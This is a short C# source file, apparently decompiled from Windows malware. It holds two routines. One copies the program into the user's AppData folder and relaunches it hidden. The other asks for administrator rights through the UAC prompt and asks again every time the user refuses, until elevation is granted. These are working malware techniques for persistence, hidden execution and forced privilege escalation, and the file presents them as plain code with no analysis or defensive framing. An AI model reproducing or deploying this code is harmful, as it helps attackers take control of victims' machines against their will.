using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace TimeTime;

internal class Utils
{
	public static void CopyItself()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Settings.encryption_hiding_process;
		File.Copy(Application.get_ExecutablePath(), text);
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = text,
			Arguments = "/a",
			WindowStyle = ProcessWindowStyle.Hidden,
			WorkingDirectory = Path.GetDirectoryName(text)
		};
		process.Start();
		Environment.Exit(0);
	}

	public static void uac_loop(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo startInfo = new ProcessStartInfo(text2)
		{
			UseShellExecute = true,
			Verb = "runas",
			WindowStyle = ProcessWindowStyle.Normal,
			WorkingDirectory = text,
			Arguments = "/x"
		};
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					uac_loop(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				uac_loop(processName);
			}
		}
	}
}
